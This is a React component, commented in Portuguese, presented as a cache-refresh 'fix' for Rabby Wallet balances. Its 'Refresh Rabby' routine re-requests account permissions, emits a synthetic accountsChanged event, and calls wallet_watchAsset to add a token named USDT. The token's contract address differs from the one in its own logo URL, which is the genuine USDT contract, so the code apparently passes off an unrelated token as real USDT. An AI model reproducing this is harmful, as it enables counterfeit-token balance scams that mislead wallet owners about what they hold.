/**
 * 🦊 COMPONENTE ESPECÍFICO PARA RABBY WALLET
 * 
 * Solução dedicada para problemas de cache do Rabby Wallet
 * 
 * @author Engenheiro Sênior
 * @version 1.0.0
 */

import React, { useState, useEffect } from 'react';

const RabbyWalletFixer = ({ address }) => {
  const [isRabby, setIsRabby] = useState(false);
  const [isFixing, setIsFixing] = useState(false);
  const [message, setMessage] = useState('');
  const [rabbyInfo, setRabbyInfo] = useState(null);

  // Detectar se é Rabby Wallet
  useEffect(() => {
    const detectRabby = () => {
      if (window.ethereum) {
        // Rabby Wallet identifiers
        const isRabbyWallet = window.ethereum.isRabby || 
                             window.ethereum._rabby || 
                             (window.ethereum.providers && 
                              window.ethereum.providers.some(p => p.isRabby));
        
        setIsRabby(isRabbyWallet);
        
        if (isRabbyWallet) {
          setRabbyInfo({
            version: window.ethereum.version || 'Desconhecida',
            chainId: window.ethereum.chainId,
            selectedAddress: window.ethereum.selectedAddress
          });
          console.log('🦊 [RABBY] Rabby Wallet detectada:', rabbyInfo);
        }
      }
    };

    detectRabby();
  }, []);

  const forceRabbyRefresh = async () => {
    if (!window.ethereum || !address || !isRabby) return;

    setIsFixing(true);
    setMessage('');

    try {
      console.log('🦊 [RABBY] Iniciando correção específica para Rabby...');

      // Método 1: Forçar re-request de contas (Rabby específico)
      try {
        await window.ethereum.request({
          method: 'eth_requestAccounts',
          params: []
        });
        console.log('✅ [RABBY] Contas re-solicitadas');
        setMessage('🔄 Contas revalidadas');
      } catch (error) {
        console.log('⚠️ [RABBY] Erro ao re-solicitar contas:', error.message);
      }

      // Método 2: Forçar mudança de conta (Rabby responde bem a isso)
      try {
        await window.ethereum.request({
          method: 'wallet_requestPermissions',
          params: [{ eth_accounts: {} }]
        });
        console.log('✅ [RABBY] Permissões re-solicitadas');
        setMessage(prev => prev + ' 🔐 Permissões atualizadas');
      } catch (error) {
        console.log('⚠️ [RABBY] Erro ao solicitar permissões:', error.message);
      }

      // Método 3: Adicionar token USDT no Rabby (força reconhecimento)
      try {
        const wasAdded = await window.ethereum.request({
          method: 'wallet_watchAsset',
          params: {
            type: 'ERC20',
            options: {
              address: '0x6A1068Dc06e723f7208932a781CbDfa95FEA76BD',
              symbol: 'USDT',
              decimals: 6,
              image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png'
            }
          }
        });
        
        if (wasAdded) {
          console.log('✅ [RABBY] Token USDT adicionado/atualizado');
          setMessage(prev => prev + ' 🪙 Token USDT reconhecido');
        }
      } catch (error) {
        console.log('⚠️ [RABBY] Erro ao adicionar token:', error.message);
      }

      // Método 4: Rabby-specific refresh via eth_getBalance
      try {
        const balance = await window.ethereum.request({
          method: 'eth_getBalance',
          params: [address, 'latest']
        });
        console.log('🦊 [RABBY] Saldo ETH consultado:', balance);
        setMessage(prev => prev + ' ⚡ Saldo consultado');
      } catch (error) {
        console.log('⚠️ [RABBY] Erro ao consultar saldo:', error.message);
      }

      // Método 5: Trigger evento de mudança de conta (Rabby específico)
      try {
        if (window.ethereum.emit) {
          window.ethereum.emit('accountsChanged', [address]);
          console.log('✅ [RABBY] Evento accountsChanged disparado');
          setMessage(prev => prev + ' 🔔 Eventos disparados');
        }
      } catch (error) {
        console.log('⚠️ [RABBY] Erro ao disparar eventos:', error.message);
      }

      setMessage(prev => prev + ' ✅ Refresh Rabby concluído!');

    } catch (error) {
      console.error('❌ [RABBY] Erro geral:', error);
      setMessage('❌ Erro ao forçar atualização no Rabby');
    } finally {
      setIsFixing(false);
    }
  };

  const refreshRabbyPage = () => {
    console.log('🦊 [RABBY] Recarregando página para refresh completo...');
    window.location.reload();
  };

  if (!isRabby || !address) return null;

  return (
    <div style={{
      backgroundColor: '#f3e8ff',
      border: '1px solid #a855f7',
      borderRadius: '8px',
      padding: '12px',
      marginBottom: '16px'
    }}>
      <div style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        marginBottom: '8px'
      }}>
        <div>
          <div style={{
            color: '#581c87',
            fontWeight: 'bold',
            fontSize: '14px'
          }}>
            🦊 Corrigir Saldo Rabby Wallet
          </div>
          <div style={{
            fontSize: '12px',
            color: '#6b21a8'
          }}>
            Rabby detectada - Refresh específico
          </div>
          {rabbyInfo && (
            <div style={{
              fontSize: '10px',
              color: '#7c3aed'
            }}>
              Chain: {parseInt(rabbyInfo.chainId || '0x0', 16)} | Conta: {rabbyInfo.selectedAddress?.slice(0, 6)}...
            </div>
          )}
        </div>
        
        <div style={{ display: 'flex', gap: '6px', flexDirection: 'column' }}>
          <button
            onClick={forceRabbyRefresh}
            disabled={isFixing}
            style={{
              backgroundColor: isFixing ? '#94a3b8' : '#a855f7',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              padding: '6px 12px',
              fontSize: '11px',
              cursor: isFixing ? 'not-allowed' : 'pointer',
              fontWeight: '500'
            }}
          >
            {isFixing ? '🔄 Atualizando...' : '🦊 Refresh Rabby'}
          </button>
          
          <button
            onClick={refreshRabbyPage}
            style={{
              backgroundColor: '#7c3aed',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              padding: '4px 8px',
              fontSize: '10px',
              cursor: 'pointer',
              fontWeight: '400'
            }}
          >
            🔄 Reload Página
          </button>
        </div>
      </div>
      
      {message && (
        <div style={{
          fontSize: '11px',
          color: '#581c87',
          backgroundColor: '#faf5ff',
          padding: '6px',
          borderRadius: '4px',
          marginTop: '8px'
        }}>
          {message}
        </div>
      )}
      
      <div style={{
        fontSize: '11px',
        color: '#6b21a8',
        lineHeight: '1.4',
        marginTop: '8px'
      }}>
        🦊 <strong>Rabby Wallet</strong> tem cache mais persistente que MetaMask. 
        Use "Refresh Rabby" para métodos específicos ou "Reload Página" para refresh completo.
      </div>
    </div>
  );
};

export default RabbyWalletFixer;

